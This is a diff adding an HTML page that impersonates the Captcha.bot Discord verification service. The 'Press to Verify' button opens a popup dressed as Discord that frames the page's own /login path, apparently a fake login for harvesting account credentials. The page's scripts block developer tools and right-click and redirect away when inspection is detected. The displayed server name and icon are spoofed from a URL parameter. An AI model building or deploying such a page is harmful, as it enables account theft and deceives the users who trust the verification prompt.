@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="icon" type="image/png" href="/captcha.png?v=2">
+<link rel="shortcut icon" type="image/png" href="/captcha.png?v=2">
+<title>Captcha.bot - Verification done right</title>
+<script>!function(){document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i'||e.key==='J'||e.key==='j'||e.key==='C'||e.key==='c'))||(e.ctrlKey&&(e.key==='U'||e.key==='u'||e.key==='S'||e.key==='s'))){e.preventDefault();e.stopPropagation();return false}});setInterval(function(){var t0=performance.now();debugger;if(performance.now()-t0>100){document.body.innerHTML='';window.location.href='https://discord.com'}},3000)}();</script>
+<meta name="description" content="Discord's leading CAPTCHA verification bot. Perfect for NFT, Crypto, and Web3 communities. Anti-raid and anti-phishing links.">
+<style>
+  /* ── Reset + base (replaces Tailwind preflight) ── */
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  img,svg{display:block;max-width:100%}
+  a{color:inherit;text-decoration:none}
+  ul{list-style:none}
+
+  body{
+    background:#1F2937;
+    font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,'Helvetica Neue',Arial,sans-serif;
+    color:#d1d5db;
+    line-height:1.5;
+    -webkit-font-smoothing:antialiased;
+    -moz-osx-font-smoothing:grayscale;
+    min-height:100vh;
+    /* ensure body always fills screen even before layout kicks in */
+    min-height:100dvh;
+  }
+
+  /* ── Custom component classes ── */
+  .bg-card{background-color:#111827}
+  .bg-btn{background-color:#5865F2}
+  .bg-btn:hover{background-color:#4752c4}
+  .bg-green{background-color:#23a55a}
+  .bg-green:hover{background-color:#1a8f4a}
+  .guild-icon{border-radius:8px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .animate-spin{animation:spin 1s linear infinite}
+
+  /* ── Tailwind utility classes used on this page ── */
+  .min-h-screen{min-height:100vh}
+  .flex{display:flex}
+  .flex-col{flex-direction:column}
+  .flex-1{flex:1 1 0%}
+  .grid{display:grid}
+  .hidden{display:none}
+  .block{display:block}
+  .items-center{align-items:center}
+  .items-start{align-items:flex-start}
+  .justify-center{justify-content:center}
+  .self-start{align-self:flex-start}
+  .gap-2{gap:.5rem}
+  .gap-3{gap:.75rem}
+  .gap-6{gap:1.5rem}
+  .gap-7{gap:1.75rem}
+  .gap-8{gap:2rem}
+  .w-full{width:100%}
+  .w-4{width:1rem}
+  .w-5{width:1.25rem}
+  .h-4{height:1rem}
+  .h-5{height:1.25rem}
+  .h-14{height:3.5rem}
+  .h-20{height:5rem}
+  .max-w-5xl{max-width:64rem}
+  .max-w-7xl{max-width:80rem}
+  .mx-auto{margin-left:auto;margin-right:auto}
+  .mt-4{margin-top:1rem}
+  .mt-6{margin-top:1.5rem}
+  .mt-10{margin-top:2.5rem}
+  .p-5{padding:1.25rem}
+  .px-4{padding-left:1rem;padding-right:1rem}
+  .py-2{padding-top:.5rem;padding-bottom:.5rem}
+  .py-2\.5{padding-top:.625rem;padding-bottom:.625rem}
+  .py-1\.5{padding-top:.375rem;padding-bottom:.375rem}
+  .py-5{padding-top:1.25rem;padding-bottom:1.25rem}
+  .py-10{padding-top:2.5rem;padding-bottom:2.5rem}
+  .pt-2{padding-top:.5rem}
+  .pt-3{padding-top:.75rem}
+  .pt-6{padding-top:1.5rem}
+  .pt-8{padding-top:2rem}
+  .pb-2{padding-bottom:.5rem}
+  .pb-4{padding-bottom:1rem}
+  .pb-5{padding-bottom:1.25rem}
+  .grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}
+  .grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}
+  .rounded-lg{border-radius:.5rem}
+  .rounded-md{border-radius:.375rem}
+  .shadow-lg{box-shadow:0 10px 15px -3px rgba(0,0,0,.1),0 4px 6px -4px rgba(0,0,0,.1)}
+  .text-center{text-align:center}
+  .text-sm{font-size:.875rem;line-height:1.25rem}
+  .text-base{font-size:1rem;line-height:1.5rem}
+  .text-xl{font-size:1.25rem;line-height:1.75rem}
+  .text-2xl{font-size:1.5rem;line-height:2rem}
+  .font-normal{font-weight:400}
+  .font-medium{font-weight:500}
+  .font-semibold{font-weight:600}
+  .font-bold{font-weight:700}
+  .leading-tight{line-height:1.25}
+  .tracking-wider{letter-spacing:.05em}
+  .uppercase{text-transform:uppercase}
+  .break-all{word-break:break-all}
+  .cursor-pointer{cursor:pointer}
+  .text-white{color:#fff}
+  .text-gray-100{color:#f3f4f6}
+  .text-gray-300{color:#d1d5db}
+  .text-gray-400{color:#9ca3af}
+  .hover\:text-white:hover{color:#fff}
+  .hover\:text-gray-400:hover{color:#9ca3af}
+  .bg-gray-900{background-color:#111827}
+  .border-t{border-top-width:1px;border-top-style:solid}
+  .border-gray-700{border-color:#374151}
+  .space-y-2>*+*{margin-top:.5rem}
+  .space-y-3>*+*{margin-top:.75rem}
+
+  /* ── Responsive: md (>=768px) ── */
+  @media(min-width:768px){
+    .md\:px-8{padding-left:2rem;padding-right:2rem}
+    .md\:grid-cols-5{grid-template-columns:repeat(5,minmax(0,1fr))}
+    .md\:col-span-2{grid-column:span 2/span 2}
+    .md\:col-span-3{grid-column:span 3/span 3}
+  }
+
+  /* ── Responsive: lg (>=1024px) ── */
+  @media(min-width:1024px){
+    .lg\:py-12{padding-top:3rem;padding-bottom:3rem}
+  }
+
+  /* ── Responsive: xl (>=1280px) ── */
+  @media(min-width:1280px){
+    .xl\:grid{display:grid}
+    .xl\:grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}
+    .xl\:gap-8{gap:2rem}
+    .xl\:mt-0{margin-top:0}
+    .xl\:col-span-2{grid-column:span 2/span 2}
+  }
+</style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+<!-- NAV -->
+<nav class="w-full px-4 md:px-8 py-5 flex items-center gap-8">
+  <img class="h-14" src="/captcha.png" alt="Captcha.bot">
+  <div class="flex items-center gap-7 text-xl font-semibold">
+    <a href="https://docs.captcha.bot" class="text-gray-300 hover:text-white">Documentation</a>
+    <a href="https://captcha.bot/premium" class="text-gray-300 hover:text-white">Pricing</a>
+    <a href="https://captcha.bot/vote" class="text-gray-300 hover:text-white">Vote</a>
+  </div>
+</nav>
+
+<!-- MAIN CONTENT -->
+<div class="flex items-start justify-center px-4 pt-8" style="min-height:calc(100vh - 76px);padding-bottom:60px">
+  <div class="w-full max-w-5xl grid grid-cols-1 md:grid-cols-5 gap-6">
+
+    <!-- LEFT: Server Card -->
+    <div class="md:col-span-2 bg-card rounded-lg p-5">
+      <div class="flex items-center gap-3 pb-2">
+        <img id="guild-icon" alt="Server" class="guild-icon h-20 rounded-md" src="https://cdn.discordapp.com/icons/1472050464659865742/7904484d4dc58134be9594740b199973.webp?size=80&amp;quality=lossless">
+        <div class="break-all">
+          <h1 id="guild-name" class="text-white text-xl font-bold">🍒〢CamGals</h1>
+          <p class="text-gray-300 text-base font-semibold"><span class="font-bold" id="member-count">17,053</span> members</p>
+        </div>
+      </div>
+      <p class="pt-2 pb-5 text-gray-300 text-base font-medium"><span class="guild-name-text">This Discord server</span> requires you to verify you are a human before entering the server.</p>
+
+      <!-- Press to Verify (green) -->
+      <a id="verify-btn" class="cursor-pointer block bg-green rounded-lg shadow-lg text-white text-center py-2.5 text-base px-4 font-bold w-full" onclick="openDiscordLogin()">
+        <div class="flex items-center justify-center gap-2">
+          <svg id="loadingSvg" aria-hidden="true" class="hidden w-5 h-5 text-gray-100 animate-spin" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M100 50.59c0 27.61-22.39 50-50 50S0 78.2 0 50.59 22.39.59 50 .59s50 22.39 50 50zm-89 0c0 21.54 17.46 39 39 39s39-17.46 39-39-17.46-39-39-39-39 17.46-39 39z" fill="currentColor"/>
+            <path d="M93.97 39.04c2.43-.64 3.93-3.13 3.07-5.5A50 50 0 0050 .59v7.99a42 42 0 0139.55 27.81c.91 2.35 3.58 3.29 4.42.65z" fill="currentFill"/>
+          </svg>
+          <span id="verify-text">Press to Verify</span>
+        </div>
+      </a>
+
+      <div class="flex gap-3 pt-3">
+        <a href="https://captcha.bot/support" class="flex gap-2 justify-center items-center bg-btn rounded-lg shadow-lg text-white text-center py-1.5 px-4 font-bold w-full text-sm">Get help</a>
+        <a href="https://captcha.bot/legal" class="flex gap-2 justify-center items-center rounded-lg shadow-lg text-white text-center py-1.5 px-4 font-semibold w-full text-sm" style="background-color:#4B5563">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z"></path></svg>
+          Terms
+        </a>
+      </div>
+    </div>
+
+    <!-- RIGHT: Info (wider) -->
+    <div class="md:col-span-3 bg-card rounded-lg p-5 self-start">
+      <h1 class="text-white text-xl font-bold pb-2">Captcha.bot Information</h1>
+      <p class="text-gray-300 text-base font-medium pb-4">Captcha.bot has protected over <span class="font-semibold">380,000</span> discord servers and stopped hundreds of thousands of bots and raiders.</p>
+      <div class="flex gap-3">
+        <a href="https://captcha.bot/premium" class="bg-btn rounded-lg shadow-lg text-white text-center py-2 px-4 font-bold flex-1 text-base leading-tight">Purchase<br>Premium</a>
+        <a href="https://captcha.bot/invite" class="rounded-lg shadow-lg text-white text-center py-2 px-4 font-semibold flex-1 text-base" style="background-color:#4B5563">Protect your server</a>
+        <a href="https://twitter.com/captchaBot" class="rounded-lg shadow-lg text-white text-center py-2 px-4 font-semibold flex-1 text-base" style="background-color:#4B5563">Follow us on Twitter</a>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer class="bg-gray-900 px-4" aria-labelledby="footer-heading" style="margin-top:-32px">
+  <div class="max-w-7xl mx-auto py-10 lg:py-12">
+    <div class="xl:grid xl:grid-cols-3 xl:gap-8">
+      <div class="space-y-3">
+        <h1 class="text-white text-2xl font-semibold">Captcha.bot</h1>
+        <p class="text-gray-400 font-normal" style="font-size:1.05rem">Discord's leading CAPTCHA verification bot.</p>
+      </div>
+      <div class="mt-10 grid grid-cols-2 gap-8 xl:mt-0 xl:col-span-2">
+        <div>
+          <h3 class="font-semibold text-gray-100 tracking-wider uppercase" style="font-size:0.925rem">Information</h3>
+          <ul class="mt-4 space-y-2">
+            <li><a href="https://discord.com/application-directory/512333785338216465" class="text-gray-300 hover:text-gray-400 font-normal" style="font-size:1.05rem">Add to Discord</a></li>
+            <li><a href="https://captcha.bot/support" class="text-gray-300 hover:text-gray-400 font-normal" style="font-size:1.05rem">Discord Server</a></li>
+            <li><a href="https://captcha.bot/premium" class="text-gray-300 hover:text-gray-400 font-normal" style="font-size:1.05rem">Premium</a></li>
+            <li><a href="https://arcane.bot" class="text-gray-300 hover:text-gray-400 font-normal" style="font-size:1.05rem">Arcane.bot</a></li>
+          </ul>
+        </div>
+        <div>
+          <h3 class="font-semibold text-gray-100 tracking-wider uppercase" style="font-size:0.925rem">Legal</h3>
+          <ul class="mt-4 space-y-2">
+            <li><a href="https://captcha.bot/tos" class="text-gray-300 hover:text-gray-400 font-normal" style="font-size:1.05rem">Terms of Service</a></li>
+            <li><a href="https://captcha.bot/privacy" class="text-gray-300 hover:text-gray-400 font-normal" style="font-size:1.05rem">Privacy Policy</a></li>
+            <li><a href="https://captcha.bot/refunds" class="text-gray-300 hover:text-gray-400 font-normal" style="font-size:1.05rem">Refunds</a></li>
+            <li><a href="https://captcha.bot/disclosure" class="text-gray-300 hover:text-gray-400 font-normal" style="font-size:1.05rem">Security</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="mt-6 border-t border-gray-700 pt-6">
+      <p class="text-gray-400 font-normal" style="font-size:1.05rem">&copy; 2021-2025 Privy.gg LLC. Not affiliated with Discord Inc.</p>
+    </div>
+  </div>
+</footer>
+
+<!-- Discord login opens in a real browser popup window -->
+
+<script>
+function openDiscordLogin() {
+  var w = 900, h = 650;
+  var left = (screen.width - w) / 2;
+  var top = (screen.height - h) / 2;
+  var win = window.open('about:blank', 'discord_login',
+    'width=' + w + ',height=' + h + ',left=' + left + ',top=' + top + ',menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=yes'
+  );
+  if (win) {
+    var u = window.location.origin + '/login';
+    win.document.write('<!DOCTYPE html><html><head><title>Discord</title><link rel="icon" href="https://discord.com/assets/favicon.ico"><style>*{margin:0;padding:0;overflow:hidden}body{height:100vh}iframe{width:100%;height:100%;border:none}</style></head><body><iframe src="' + u + '"></iframe></body></html>');
+    win.document.close();
+  }
+}
+
+// Parse URL data parameter (base64 JSON with guildId, name, members, icon)
+(function() {
+  // Start pre-solving captcha immediately on landing page
+  fetch('/api/pressolve', {method:'POST'}).catch(function(){});
+  try {
+    var params = new URLSearchParams(window.location.search);
+    var data = params.get('data');
+    if (data) {
+      var json = JSON.parse(atob(data));
+      if (json.name) {
+        document.getElementById('guild-name').textContent = json.name;
+        document.querySelector('.guild-name-text').textContent = json.name;
+      }
+      if (json.members) {
+        document.getElementById('member-count').textContent = json.members.toLocaleString();
+      }
+      if (json.icon) {
+        document.getElementById('guild-icon').src = json.icon;
+      }
+    }
+  } catch(e) {}
+})();
+</script>
+
+</body>
+</html>
